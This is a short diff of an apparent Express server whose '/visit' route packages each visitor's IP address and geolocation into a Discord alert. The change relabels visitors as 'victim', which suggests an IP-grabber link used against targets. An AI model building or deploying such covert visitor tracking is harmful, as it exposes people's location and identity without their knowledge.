@@ -21,7 +21,7 @@ app.get("/visit", async (req, res) => {
 
         // Prepare Discord payload
         const payload = {
-            content: `📢 New visitor detected!
+            content: `📢 New victim detected!
 🌐 IP: ${geoData.query}
 ✅ Status: ${geoData.status}
 🌍 Continent: ${geoData.continent} (${geoData.continentCode})
@@ -54,3 +54,4 @@ app.get("/visit", async (req, res) => {
 // Listen on Render's assigned port
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
+
